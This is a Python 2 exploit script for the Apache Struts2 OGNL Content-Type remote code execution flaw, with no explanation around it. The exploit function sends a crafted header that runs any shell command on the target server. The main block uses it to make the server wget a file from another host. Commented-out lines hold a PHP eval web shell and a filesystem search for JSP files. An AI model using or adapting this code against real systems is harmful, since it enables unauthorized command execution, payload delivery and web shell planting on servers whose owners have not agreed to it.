# coding:utf-8
import requests
import re
import urllib2
import httplib


def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial
    return page


# 获取webpath
def getwebpath(url, cmd):
    re_webpath = re.compile(r'.+webapps\/\w+\/')
    str = exploit(url, cmd)
    webpath = re_webpath.search(str)
    if webpath:
        print webpath.group()
    else:
        print 'no'



if __name__ == '__main__':
    url = 'http://192.168.40.26:8081'
    # jsp = str.encode("<?php @eval($_POST[__RANDPASS__]); ?>")
    # jsp = unicode("<?php @eval($_POST[__RANDPASS__]); ?>", 'utf-8')
    # print jsp, type(jsp)
    # jsp = unicode("swm", 'utf-8')
    # filename = '/home/'
    # cmd = 'find / -name *.jsp'
    cmd = '''wget http://172.22.209.33:8014/api/download -O /home/nuonuo.swm'''
    # print cmd
    # getwebpath(url, cmd)
    res = exploit(url, cmd)
    print res